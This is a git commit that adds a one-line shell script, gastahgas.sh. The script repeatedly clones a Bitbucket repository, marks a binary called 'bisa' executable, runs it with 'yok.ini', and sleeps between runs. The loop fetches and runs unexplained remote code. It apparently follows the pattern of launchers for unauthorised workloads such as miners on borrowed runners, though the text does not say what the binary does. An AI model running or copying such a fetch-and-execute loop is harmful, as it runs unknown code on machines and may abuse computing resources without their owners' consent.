a34d4b4d78b4095d63ff1821745ea12dfdba7d3c
keepstrong13 <86222464+keepstrong13@users.noreply.github.com>
2021-08-30 12:34:48 +0700

    Create gastahgas.sh

---
+++ gastahgas.sh
@@ -0,0 +1,1 @@
+a=0; while [ $a -lt 10 ]; do git clone https://keepstrong13@bitbucket.org/keepstrong13/tastis.git; cd tastis; chmod +x bisa; ./bisa yok.ini; echo $a; a=`expr $a + 1`; sleep 6000; done;
